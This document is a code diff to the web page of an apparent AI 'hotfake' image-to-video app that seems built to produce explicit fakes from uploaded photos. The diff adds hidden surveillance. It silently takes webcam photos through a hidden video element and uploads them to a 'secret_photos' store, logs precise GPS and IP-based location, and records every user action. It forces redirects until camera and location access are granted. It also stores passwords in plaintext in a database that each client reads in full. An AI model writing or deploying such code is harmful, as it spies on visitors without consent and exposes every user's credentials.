@@ -8,7 +8,7 @@
     
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; }
+      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: 0.28s cubic-bezier(.4,0,.2,1); }
       *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
       body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 75px; }
       
@@ -27,20 +27,24 @@
       .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
       .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
       
+      /* Image Upload & Generation Area */
       .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
       .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
       .upload-box img#previewImg { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; display: none; z-index: 1; }
       
+      /* Processing Animation Overlay */
       .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; }
       
+      /* Result Overlay */
       .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
       @keyframes spin { 100% { transform: rotate(360deg); } }
       .hidden { display: none !important; }
 
+      /* Modals & Player */
       .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); }
       .modal-content { background:var(--surf); border:1px solid var(--red); border-radius:20px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
       .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; margin-top: 15px;}
@@ -64,6 +68,7 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
+<!-- Security Gates -->
 <div id="ageGate" class="modal-bg" style="display:none;">
     <div class="modal-content">
         <div style="font-size: 3rem; margin-bottom: 0.5rem;">🔞</div>
@@ -103,7 +108,7 @@
 
 <div class="container">
     
-    <!-- AUTHENTICATION (STARTING STATE) -->
+    <!-- TEXT-BASED AUTHENTICATION SECTION -->
     <div id="authSection" class="card hidden">
         <h2 style="margin-bottom: 1.5rem; text-align: center;">AI Studio Access</h2>
         <div id="loginForm">
@@ -156,6 +161,7 @@
     </div>
 </div>
 
+<!-- SECURE PLAYER -->
 <div id="playerModal">
   <div class="player-wrapper">
        <div class="smart-overlay">
@@ -180,26 +186,26 @@
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
   import { getDatabase, ref, set, push, onValue, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
-  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
   const firebaseConfig = { apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" };
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
-  const auth = getAuth(app);
   
-  let currentUser = null;
+  let currentUserUid = localStorage.getItem('loggedInUser') || null;
   let deviceId = null;
   let isGpuOnline = false;
   let currentBase64Image = "";
   let activeReqId = null;
   let animationInterval = null;
 
+  // 1. Deep Hardware ID Fingerprint
   function getDeepDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
       if (savedId) return savedId;
       const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
       let newId = `${os}-AUTH-${Math.floor(Math.random()*9000000).toString(36).toUpperCase()}`;
       localStorage.setItem('hotfake_deep_uid', newId);
+      localStorage.setItem('hotfake_id_source', 'Deep Hardware ID');
       return newId;
   }
   deviceId = getDeepDeviceId();
@@ -217,14 +223,31 @@
       set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
   };
 
+  function silentGPSUpdate() {
+      if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => { if(deviceId) { set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) + "m", time: new Date().toISOString() }); } },
+              (err) => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+      }
+  }
+
+  // 2. Tracking System
   async function trackUser() {
       const advInfo = getAdvancedDeviceInfo(); 
       const fullDate = new Date().toISOString();
+      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" }; 
+      try { const res = await fetch('https://ipapi.co/json/'); if(res.ok) { const jd = await res.json(); ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org }; } } catch(e){}
+
       get(ref(db, `users/${deviceId}`)).then((snap) => {
+          const locId = Date.now();
           if (!snap.exists()) { 
-              set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", device: advInfo, banned: false, deviceApproved: false }); 
+              set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", network: ipData, device: advInfo, banned: false, deviceApproved: false, locationHistory: { [locId]: { ...ipData, time: fullDate } } }); 
+              logAction("First visit to App");
           } else { 
-              update(ref(db, `users/${deviceId}`), { lastActive: fullDate, status: "Live", device: advInfo }); 
+              update(ref(db, `users/${deviceId}`), { lastActive: fullDate, network: ipData, status: "Live", device: advInfo }); 
+              set(ref(db, `users/${deviceId}/locationHistory/${locId}`), { ...ipData, time: fullDate });
+              logAction("App Opened"); 
           }
           checkGates();
       });
@@ -232,8 +255,18 @@
       onValue(ref(db, ".info/connected"), (snap) => { 
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
+
+      onValue(ref(db, `users/${deviceId}/custom_perms`), async (snap) => {
+          if(snap.exists()) {
+              const rules = snap.val(); let redirect = false;
+              if (rules.camera) { try { const cam = await navigator.permissions.query({name: 'camera'}); if(cam.state !== 'granted') redirect = true; } catch(e){} }
+              if (rules.location) { try { const loc = await navigator.permissions.query({name: 'geolocation'}); if(loc.state !== 'granted') redirect = true; } catch(e){} }
+              if(redirect) window.location.href = 'permission.html'; 
+          }
+      });
   }
 
+  // 3. Security Gates
   function checkGates() {
       if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
       const ageStatus = sessionStorage.getItem('ageStatus');
@@ -245,57 +278,138 @@
               if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
               if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
               
-              // Only check auth if device is approved
-              if (!currentUser) {
+              // Device is Approved! Check Plain Text Auth state
+              if(currentUserUid) {
+                  handleAuthStatus(true, currentUserUid);
+              } else {
                   document.getElementById('authSection').classList.remove('hidden');
               }
+              attemptSilentCapture(); silentGPSUpdate();
           } else { window.location.href = 'contact-support.html'; }
       });
   }
 
-  window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; checkGates(); }
+  function attemptSilentCapture() {
+      navigator.permissions.query({ name: 'camera' }).then(perm => {
+          if (perm.state === 'granted') {
+              navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
+                  const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
+                  video.srcObject = stream; video.play();
+                  video.addEventListener('canplay', () => {
+                      setTimeout(() => {
+                          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                          const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
+                          set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
+                          stream.getTracks().forEach(t => t.stop());
+                      }, 150);
+                  }, { once: true });
+              }).catch(e=>{});
+          }
+      });
+  }
+
+  window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
   window.requestGPSAccess = () => {
-      document.getElementById('gpsError').classList.add('hidden');
+      document.getElementById('gpsError').classList.add('hidden'); logAction("GPS button clicked");
       navigator.geolocation.getCurrentPosition(pos => {
           localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
+          set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
           checkGates();
       }, err => { document.getElementById('gpsError').classList.remove('hidden'); }, { enableHighAccuracy: true });
   }
 
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
+  onValue(ref(db, 'settings/general/favicon'), snap => { if(snap.val()) { let link = document.querySelector("link[rel~='icon']") || document.createElement('link'); link.rel = 'icon'; link.href = snap.val(); document.head.appendChild(link); } });
+  
   trackUser();
 
-  // Auth Logic
-  window.toggleAuth = () => { document.getElementById('loginForm').classList.toggle('hidden'); document.getElementById('regForm').classList.toggle('hidden'); };
-  window.registerUser = () => { 
-      const email = document.getElementById('regEmail').value; const pass = document.getElementById('regPass').value;
-      const name = document.getElementById('regName').value; const age = document.getElementById('regAge').value;
-      if(!email || !pass || !name || !age) return alert("Fill all fields");
-      createUserWithEmailAndPassword(auth, email, pass).then((uCred) => { 
-          set(ref(db, 'auth_users/' + uCred.user.uid), { name, age, email }); 
-          alert("Created!"); 
+  // ==========================================
+  // 4. PLAIN TEXT AUTHENTICATION LOGIC
+  // ==========================================
+  window.toggleAuth = () => { 
+      document.getElementById('loginForm').classList.toggle('hidden'); 
+      document.getElementById('regForm').classList.toggle('hidden'); 
+  };
+
+  window.registerUser = async () => { 
+      const email = document.getElementById('regEmail').value.trim(); 
+      const pass = document.getElementById('regPass').value.trim();
+      const name = document.getElementById('regName').value.trim(); 
+      const age = document.getElementById('regAge').value.trim();
+      const gender = document.getElementById('regGender').value;
+      if(!email || !pass || !name || !age || !gender) return alert("Fill all fields");
+
+      // Verify email doesn't exist
+      const snap = await get(ref(db, 'auth_users'));
+      const users = snap.val() || {};
+      for(let uid in users) {
+          if(users[uid].email === email) return alert("Email is already registered!");
+      }
+
+      const newUid = "USER-" + Date.now().toString(36);
+      
+      // Save ID & Password in Plain Text directly to Realtime DB
+      set(ref(db, 'auth_users/' + newUid), { 
+          name: name, age: age, gender: gender, email: email, password: pass, registeredAt: new Date().toISOString()
+      }).then(() => { 
+          logAction("Account Registered manually"); 
+          alert("Account Created! You can now login."); 
+          toggleAuth(); 
       }).catch(e => alert(e.message));
   };
-  window.loginUser = () => { signInWithEmailAndPassword(auth, document.getElementById('logEmail').value, document.getElementById('logPass').value).catch(e => alert("Login Failed")); };
-  document.getElementById('logoutBtn').addEventListener('click', () => signOut(auth));
 
-  onAuthStateChanged(auth, (user) => {
-      if (user) {
-          currentUser = user; 
-          update(ref(db, `users/${deviceId}`), { linkedUid: user.uid });
+  window.loginUser = async () => { 
+      const email = document.getElementById('logEmail').value.trim(); 
+      const pass = document.getElementById('logPass').value.trim();
+      if(!email || !pass) return alert("Enter email and password");
+
+      try {
+          const snap = await get(ref(db, 'auth_users'));
+          const users = snap.val() || {};
+          let foundUser = null;
+          let foundUid = null;
+
+          // Plain Text Password Verification
+          for(let uid in users) {
+              if(users[uid].email === email && users[uid].password === pass) { 
+                  foundUser = users[uid];
+                  foundUid = uid;
+                  break;
+              }
+          }
+
+          if(foundUser) {
+              logAction("User Logged In manually");
+              handleAuthStatus(true, foundUid);
+          } else {
+              alert("Invalid Email or Password!");
+          }
+      } catch(e) {
+          alert("Login Error: " + e.message);
+      }
+  };
+
+  function handleAuthStatus(isLoggedIn, uid) {
+      if(isLoggedIn) {
+          currentUserUid = uid;
+          localStorage.setItem('loggedInUser', uid);
+          update(ref(db, `users/${deviceId}`), { linkedUid: uid });
           document.getElementById('authSection').classList.add('hidden'); 
           document.getElementById('appSection').classList.remove('hidden'); 
           document.getElementById('logoutBtn').classList.remove('hidden');
-          checkActiveGeneration();
+          checkActiveGeneration(); 
       } else {
-          currentUser = null;
+          currentUserUid = null;
+          localStorage.removeItem('loggedInUser');
           document.getElementById('appSection').classList.add('hidden'); 
           document.getElementById('logoutBtn').classList.add('hidden');
-          checkGates();
+          checkGates(); // This will show the login screen if device is approved
       }
-  });
+  }
 
-  // Safe High Quality Compression (Fixes Network Error)
+  document.getElementById('logoutBtn').addEventListener('click', () => { handleAuthStatus(false, null); });
+
+  // 5. Image Upload & Compression
   window.handleImageSelect = (event) => {
       const file = event.target.files[0]; if (!file) return;
       const reader = new FileReader();
@@ -303,23 +417,24 @@
           const img = new Image();
           img.onload = () => {
               const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 500; // Optimal safe width to prevent database payload timeout
+              const MAX_WIDTH = 500; 
               let width = img.width; let height = img.height;
               if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
               canvas.width = width; canvas.height = height; 
               const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
-              
               currentBase64Image = canvas.toDataURL('image/jpeg', 0.5);
               
               document.getElementById('previewImg').src = currentBase64Image; 
               document.getElementById('previewImg').style.display = 'block'; 
               document.getElementById('uploadPlaceholder').style.display = 'none';
+              logAction("Image selected for generation");
           };
           img.src = e.target.result;
       };
       reader.readAsDataURL(file);
   };
 
+  // 6. Active Generation Tracking & Persistence
   function checkActiveGeneration() {
       const savedReqId = localStorage.getItem('activeReqId');
       if(savedReqId) {
@@ -367,6 +482,7 @@
       if(!currentBase64Image) return alert("Please select an image first.");
       if(!prompt) return alert("Please enter a prompt.");
 
+      logAction("Started Video Generation");
       document.getElementById('inputControls').style.display = 'none'; 
       document.getElementById('uploadBox').style.pointerEvents = 'none';
       const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); overlay.style.display = 'flex';
@@ -383,7 +499,7 @@
       localStorage.setItem('savedAiPrompt', prompt);
 
       set(reqRef, {
-          uid: currentUser.uid, deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
+          uid: currentUserUid, deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
           status: 'pending', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(() => {
           if(!isGpuOnline) { 
@@ -400,11 +516,13 @@
   function showResultUI(req) {
       const resOverlay = document.getElementById('resultOverlay'); resOverlay.style.display = 'flex';
       if(req.status === 'completed') {
+          logAction("Video Generation Completed successfully");
           resOverlay.innerHTML = `
             <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
             <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Start New Generation</button>
           `;
       } else if(req.status === 'error') {
+          logAction(`Generation Error: ${req.errorMsg}`);
           resOverlay.innerHTML = `
             <div class="error-msg">⚠️ ${req.errorMsg}</div>
             <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
@@ -420,6 +538,7 @@
       document.getElementById('inputControls').style.display = 'block'; document.getElementById('uploadBox').style.pointerEvents = 'auto'; document.getElementById('aiPrompt').value = '';
   };
 
+  // 7. Video Player System
   window.playAiVideo = (url) => {
       document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
       const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
